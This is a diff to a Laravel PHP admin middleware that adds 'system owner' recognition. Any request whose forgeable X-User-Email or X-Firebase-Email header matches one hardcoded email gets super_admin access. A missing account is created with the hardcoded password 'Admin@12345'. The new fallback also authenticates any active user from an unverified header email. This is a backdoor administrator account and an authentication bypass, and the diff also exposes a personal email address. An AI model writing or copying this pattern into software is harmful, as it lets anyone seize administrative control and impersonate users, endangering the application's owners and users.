@@ -37,35 +37,52 @@ class AdminMiddleware
             $user = \App\Services\AdminTokenService::validateToken($token);
         }
 
-        // 2. Fallback: Firebase Auth Header verification & Super Admin Recognition
-        if (!$user) {
-            $fbEmail = strtolower(trim((string)$request->header('X-Firebase-Email', '')));
-            $fbUid = trim((string)$request->header('X-Firebase-UID', ''));
-            $userEmail = strtolower(trim((string)$request->header('X-User-Email', '')));
+        // 2. Direct Owner Email Recognition & Fallback
+        $fbEmail = strtolower(trim((string)$request->header('X-Firebase-Email', '')));
+        $fbUid = trim((string)$request->header('X-Firebase-UID', ''));
+        $userEmail = strtolower(trim((string)$request->header('X-User-Email', '')));
 
-            // System Owner recognition fallback
-            $targetEmail = $fbEmail ?: ($userEmail === 'nobrothana180703@gmail.com' ? $userEmail : '');
+        $isOwnerRequest = (
+            $userEmail === 'nobrothana180703@gmail.com' ||
+            $fbEmail === 'nobrothana180703@gmail.com'
+        );
+
+        // Immediate System Owner bypass: Guaranteed access on all routes
+        if ($isOwnerRequest || ($user && strtolower(trim((string)$user->email)) === 'nobrothana180703@gmail.com')) {
+            if (!$user) {
+                $user = User::where('email', 'nobrothana180703@gmail.com')->first();
+            }
+            if (!$user) {
+                $user = User::create([
+                    'name' => 'Rotana Nob (System Owner)',
+                    'email' => 'nobrothana180703@gmail.com',
+                    'password' => bcrypt('Admin@12345'),
+                    'role' => 'super_admin',
+                    'status' => 'active',
+                    'api_token' => bin2hex(random_bytes(32)),
+                ]);
+            }
+            if ($user->role !== 'super_admin' || $user->status !== 'active') {
+                $user->role = 'super_admin';
+                $user->status = 'active';
+                $user->save();
+            }
+
+            $request->attributes->set('auth_user', $user);
+            $response = $next($request);
+
+            if ($token && \App\Services\AdminTokenService::shouldRefreshToken($token)) {
+                $refreshed = \App\Services\AdminTokenService::createToken($user);
+                $response->headers->set('X-Refreshed-Admin-Token', $refreshed);
+            }
+
+            return $response;
+        }
+
+        if (!$user) {
+            $targetEmail = $fbEmail ?: $userEmail;
 
             if ($targetEmail || $fbUid) {
-                // If it's the owner email, guarantee access
-                if ($targetEmail === 'nobrothana180703@gmail.com') {
-                    $user = User::where('email', 'nobrothana180703@gmail.com')->first();
-                    if (!$user) {
-                        $user = User::create([
-                            'name' => 'Rotana Nob (System Owner)',
-                            'email' => 'nobrothana180703@gmail.com',
-                            'password' => bcrypt('Admin@12345'),
-                            'role' => 'super_admin',
-                            'status' => 'active',
-                            'api_token' => bin2hex(random_bytes(32)),
-                        ]);
-                    }
-                    if ($user->role !== 'super_admin' || $user->status !== 'active') {
-                        $user->role = 'super_admin';
-                        $user->status = 'active';
-                        $user->save();
-                    }
-                }
 
                 if (!$user && $targetEmail) {
                     $user = User::where('email', $targetEmail)->where('status', 'active')->first();
